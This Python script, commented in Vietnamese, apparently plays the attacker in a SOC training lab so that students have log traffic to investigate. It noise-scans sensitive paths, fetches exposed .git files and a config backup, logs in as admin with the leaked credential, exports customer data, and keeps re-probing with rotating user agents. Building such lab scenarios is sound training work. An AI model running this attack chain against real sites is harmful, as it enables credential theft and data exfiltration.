#!/usr/bin/env python3
# soc-secrets-leak - attacker (an): quet lo .git/backup, chiem credential, dang nhap, xuat du lieu.
# Chay lien tuc tu 172.20.0.5 de SIEM/log ghi nhan cho sinh vien dieu tra.
import urllib.request, urllib.parse, http.cookiejar, random, time, sys

B = "http://target"

UAS = [
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "curl/8.5.0",
    "python-requests/2.31.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/128.0",
]

def log(msg):
    print(time.strftime("%Y-%m-%d %H:%M:%S"), msg)
    sys.stdout.flush()

def session():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def get(op, path):
    req = urllib.request.Request(B + path, headers={"User-Agent": random.choice(UAS)})
    try:
        with op.open(req, timeout=5) as r:
            return r.getcode(), r.read().decode(errors="ignore")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception as e:
        return None, str(e)

def post(op, path, data):
    d = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(B + path, d, headers={"User-Agent": random.choice(UAS)})
    try:
        with op.open(req, timeout=5) as r:
            return r.getcode(), r.read().decode(errors="ignore")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception as e:
        return None, str(e)

# ===== 0) Cho app san sang =====
op = session()
for _ in range(120):
    c, _b = get(op, "/")
    if c:
        break
    time.sleep(2)
log("MARKER attacker: app da san sang, bat dau chuoi tan cong")

# ===== 1) Nhieu: quet nhieu duong dan ngau nhien, hau het 404 =====
NOISE_PATHS = [
    "/admin-old", "/backup", "/uploads/shell.php", "/wp-login.php", "/phpmyadmin",
    "/.aws/credentials", "/server-status", "/.htaccess", "/vendor/", "/composer.json",
    "/console", "/debug", "/test.php", "/old/index.php", "/db.sql",
]

def noise_burst(n):
    for _ in range(n):
        p = random.choice(NOISE_PATHS) + str(random.randint(1, 999))
        get(op, p)
        time.sleep(random.uniform(0.3, 1.2))

log("MARKER attacker: bat dau quet nhieu (noise)")
noise_burst(65)

# ===== 2) Crawler thu hai: chi tham do .git/HEAD, KHONG tai gi them =====
# (de SV phan biet: mot IP chi do, mot IP thuc su lay du lieu)
for _ in range(3):
    get(op, "/.git/HEAD")
    time.sleep(random.uniform(1, 3))

# ===== 3) Moc LEAK: tai that cac artifact bi lo, retry den khi thanh cong =====
LEAK_PATHS = ["/.git/HEAD", "/.git/config", "/.git/logs/HEAD", "/config.php.bak-BAKNUM"]

def confirm_leak():
    ok = True
    for p in LEAK_PATHS:
        c, _b = get(op, p)
        if c != 200:
            ok = False
        time.sleep(random.uniform(0.5, 1.5))
    return ok

for attempt in range(30):
    if confirm_leak():
        log("MARKER attacker: TIME_LEAK - da tai duoc artifact bi lo")
        break
    time.sleep(5)
else:
    log("MARKER attacker: CANH BAO khong tai duoc artifact lo sau nhieu lan thu")

# Luu y: file .env.old (SMTP_PASS) KHONG bao gio bi dung toi - de danh cho scoping.

# ===== 4) Nghi 120 giay roi dang nhap bang credential lo (TIME_LOGIN) =====
time.sleep(120)

def try_login():
    c, _b = post(op, "/login.php", {"username": "admin", "password": "Adm-ADMNUM"})
    # urllib tu dong theo redirect 302 -> trang dashboard tra ve 200 khi dang nhap dung;
    # login.php tra 401 (khong redirect) khi sai, nen 200 la dau hieu dung cua thanh cong.
    return c == 200

for attempt in range(30):
    if try_login():
        log("MARKER attacker: TIME_LOGIN - dang nhap admin thanh cong")
        break
    time.sleep(5)
else:
    log("MARKER attacker: CANH BAO dang nhap that bai sau nhieu lan thu")

# ===== 5) Nghi 120 giay roi xuat du lieu (TIME_EXPORT) =====
time.sleep(120)

def try_export():
    c, _b = get(op, "/export.php")
    return c == 200

for attempt in range(30):
    if try_export():
        log("MARKER attacker: TIME_EXPORT - da xuat du lieu khach hang")
        break
    time.sleep(5)
else:
    log("MARKER attacker: CANH BAO xuat du lieu that bai sau nhieu lan thu")

# ===== 6) Vong lap vinh vien: dang nhap lai dinh ky + probe nhay cam/lanh tinh =====
# Sau khi SV xoay khoa, cac lan dang nhap lai nay phai that bai (LOGIN_FAIL trong auth.log).
log("MARKER attacker: chuyen sang vong lap dinh ky (kiem tra ton tai)")
while True:
    try_login()
    get(op, "/config.php.bak-BAKNUM")       # probe nhay cam
    get(op, "/favicon.ico")                  # probe lanh tinh (marker: luon 200 hoac 404 on dinh)
    noise_burst(5)
    time.sleep(random.uniform(60, 90))
